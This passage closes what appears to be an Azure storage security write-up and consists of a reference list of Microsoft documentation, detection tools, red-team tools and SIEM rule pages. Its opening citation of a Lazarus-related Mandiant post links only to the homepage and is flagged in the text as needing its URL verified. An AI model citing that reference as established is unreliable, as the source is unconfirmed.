- **Reference:** [Mandiant Blog - Lazarus Azure Attacks](https://www.mandiant.com/) [Note: Verify actual URL in production]

---

## 10. REFERENCES & TOOLING

### Official Microsoft Documentation
- [Azure Storage Analytics Logging](https://learn.microsoft.com/en-us/azure/storage/common/storage-analytics-logging)
- [Azure Blob Storage Security Best Practices](https://learn.microsoft.com/en-us/azure/storage/blobs/security-recommendations)
- [Azure Diagnostic Settings](https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/diagnostic-settings)
- [Storage Account Keys and SAS Tokens](https://learn.microsoft.com/en-us/azure/storage/common/storage-account-keys-manage)

### Detection & Monitoring Tools
- [Microsoft Defender for Storage](https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-storage-introduction)
- [Azure Monitor Logs (Log Analytics)](https://learn.microsoft.com/en-us/azure/azure-monitor/logs/log-analytics-overview)
- [Microsoft Sentinel - Azure Storage Workbook](https://github.com/Azure/Azure-Sentinel/tree/master/Workbooks/Azure%20Storage)

### Red Teaming / PoC Tools
- [Stormspotter](https://github.com/Azure/Stormspotter) — Cloud privilege escalation visualization
- [ROADtools](https://github.com/dirkjanm/ROADtools) — Entra ID enumeration
- [AzCopy](https://learn.microsoft.com/en-us/azure/storage/common/storage-use-azcopy-v10) — Official CLI for bulk data transfer
- [PowerZure](https://github.com/hausec/PowerZure) — Azure penetration testing framework

### SIEM/SOC Rules
- [Splunk - Azure Storage Anomaly Detection](https://splunkbase.splunk.com/)
- [Elastic - Azure Storage Security Monitoring](https://www.elastic.co/guide/en/security/current/)
- [Azure Sentinel - Storage Account Template](https://github.com/Azure/Azure-Sentinel/tree/master/Templates)

---